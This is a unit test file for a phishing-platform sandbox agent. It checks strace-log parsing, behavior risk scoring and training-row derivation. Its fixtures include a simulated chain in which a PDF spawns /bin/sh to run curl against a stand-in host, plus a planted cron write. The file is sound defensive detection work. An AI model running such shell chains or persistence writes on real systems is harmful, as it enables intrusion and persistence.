"""Unit tests for sandbox behavior parsing and scoring."""

from __future__ import annotations

from pathlib import Path

from soc_platform.domains.phishing.engine.agents.sandbox_agent.agent import (
    _derive_training_row,
    _extract_behavior_from_strace,
    _score_behavior_signals,
)


def test_extract_behavior_detects_remote_shell_chain() -> None:
    logs = '12:00:00 execve("/sandbox/input/sample.pdf", ["sample.pdf"], 0x0) = 0\n12:00:01 execve("/bin/sh", ["sh", "-c", "curl http://bad.example"], 0x0) = 0\n12:00:02 execve("/usr/bin/curl", ["curl", "http://bad.example"], 0x0) = 0\n12:00:03 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("8.8.8.8")}, 16) = 0'

    behavior = _extract_behavior_from_strace(logs)

    assert behavior["shell_spawned"] is True
    assert behavior["critical_chain_detected"] is True
    assert "8.8.8.8" in behavior["remote_ips"]
    assert "/bin/sh" in behavior["exec_chain"]


def test_extract_behavior_ignores_private_network_connects() -> None:
    logs = (
        '12:00:00 connect(3, {sa_family=AF_INET, sin_port=htons(443), '
        'sin_addr=inet_addr("10.0.0.5")}, 16) = 0\n'
        '12:00:01 connect(3, {sa_family=AF_INET, sin_port=htons(443), '
        'sin_addr=inet_addr("192.168.1.10")}, 16) = 0\n'
    )

    behavior = _extract_behavior_from_strace(logs)

    assert behavior["remote_ips"] == []


def test_score_enforces_high_risk_for_remote_or_shell() -> None:
    behavior = {
        "exec_chain": ["/bin/sh", "/usr/bin/curl"],
        "remote_ips": ["8.8.4.4"],
        "sensitive_writes": [],
        "shell_spawned": True,
        "network_tool_spawned": True,
        "critical_chain_detected": True,
    }

    score, indicators = _score_behavior_signals(behavior, timed_out=False, nonzero_exit=False)

    assert score > 0.85
    assert "shell_spawn_detected" in indicators
    assert "remote_connect_detected" in indicators
    assert "critical_chain_detected" in indicators


def test_score_marks_sensitive_write() -> None:
    behavior = {
        "exec_chain": ["/sandbox/input/sample.bin"],
        "remote_ips": [],
        "sensitive_writes": ["/etc/cron.d/maljob"],
        "shell_spawned": False,
        "network_tool_spawned": False,
        "critical_chain_detected": False,
    }

    score, indicators = _score_behavior_signals(behavior, timed_out=True, nonzero_exit=True)

    assert score > 0.35
    assert "sensitive_fs_modification" in indicators
    assert "detonation_timeout" in indicators
    assert "nonzero_exit_status" in indicators


def test_derive_training_row_from_behavior(tmp_path: Path) -> None:
    sample = tmp_path / "invoice.pdf"
    sample.write_bytes(b"A" * 128 + b"B" * 64)

    signals = {
        "exec_chain": ["/sandbox/input/invoice.pdf", "/bin/sh", "/usr/bin/curl"],
        "remote_ips": ["8.8.8.8"],
        "sensitive_writes": ["/etc/cron.d/job"],
        "critical_chain_detected": True,
    }

    row = _derive_training_row(
        target=sample,
        signals=signals,
        timed_out=False,
        exit_code=0,
        risk_score=0.91,
    )

    assert row["executed"] == 1
    assert row["file_extension"] == ".pdf"
    assert row["execve_calls"] == 3
    assert row["connect_calls"] == 1
    assert row["file_write_calls"] == 1
    assert row["sequence_process_calls"] == 3
    assert row["sequence_network_calls"] == 1
    assert row["sequence_filesystem_calls"] == 1
    assert row["sequence_length"] == 5
    assert row["behavior_risk_score"] >= 0.9
